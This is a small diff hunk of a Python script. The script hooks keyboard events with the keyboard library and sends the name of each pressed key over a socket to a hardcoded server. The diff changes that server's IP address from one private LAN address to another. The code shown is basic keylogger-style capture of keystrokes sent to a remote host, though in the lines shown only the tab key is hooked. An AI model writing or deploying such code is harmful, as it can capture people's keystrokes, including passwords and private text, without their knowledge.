@@ -3,13 +3,12 @@
 import socket
 import keyboard
 
-
 def key_callback(event):
 	if(event.event_type == "down"):
 
 		s.sendall(event.name.encode())
 
-HOST = "192.168.1.20"  # The server's hostname or IP address
+HOST = "192.168.50.224"  # The server's hostname or IP address
 PORT = 8000        # The port used by the server
 
 keyboard.hook_key('tab', key_callback)
